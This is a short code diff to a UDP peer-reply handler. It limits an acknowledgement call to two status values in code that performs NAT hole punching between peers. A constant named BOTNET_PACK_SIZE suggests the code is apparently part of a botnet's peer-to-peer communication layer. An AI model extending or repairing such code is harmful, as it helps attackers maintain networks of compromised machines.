@@ -208,7 +208,8 @@ static void handle_peer_reply(const u_char* data, struct sockaddr_in& client)
 	if (status)
 	{
 		/* stage 1 - acknowledge back (local/remote) */
-		sync_reply(peer);
+		if (status == 1 || status == 2)
+			sync_reply(peer);
 
 		/* stage 2 - hole punching (remote only) */
 		if (status == 2)
@@ -223,7 +224,6 @@ static void handle_peer_reply(const u_char* data, struct sockaddr_in& client)
 
 		/* send to peer */
 		sendto(udp_sock, (char*)&pack, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&peer, sizeof(peer));
-
 	}
 }
 
